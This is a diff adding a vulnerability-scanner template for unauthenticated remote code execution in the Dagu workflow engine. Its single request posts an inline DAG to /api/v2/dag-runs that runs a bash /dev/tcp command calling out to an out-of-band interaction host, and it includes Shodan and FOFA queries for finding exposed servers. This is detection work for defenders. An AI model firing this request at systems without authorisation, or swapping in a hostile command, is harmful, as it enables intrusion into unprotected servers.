@@ -1,0 +1,47 @@
+id: dagu-rce
+
+info:
+  name: Dagu Workflow Engine - Remote Code Execution
+  author: omarkurt
+  severity: critical
+  description: |
+    Dagu (<= 1.30.3) ships with authentication disabled by default. The POST /api/v2/dag-runs endpoint accepts inline YAML DAG specifications and immediately executes shell commands without credentials.
+  remediation: Upgrade to a patched version.
+  reference:
+    - https://github.com/dagu-org/dagu
+    - https://vulnerabletarget.com/vt-dagu
+    - https://github.com/advisories/GHSA-6qr9-g2xw-cw92
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-306
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: dagu-org
+    product: dagu
+    shodan-query: 'title:"Dagu"'
+    fofa-query: 'title="Dagu"'
+  tags: dagu,rce,oob,unauth,vuln
+
+variables:
+  dag_name: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/v2/dag-runs HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c 'echo vt > /dev/tcp/{{interactsh-url}}/80'\n"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "dagRunId")'
+          - 'contains(content_type, "application/json")'
+          - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
+          - 'status_code == 200'
+        condition: and
+# digest: 490a004630440220059e3867117ce2142c24bf39408bc63fb401a85e62476346ab672b90c84a98400220093b9cc0ccf98fad4211f3a6adeb77262e7af36bda2d14daadc8d9e68f8862ed:922c64590222798bb761d5b6d8e72950
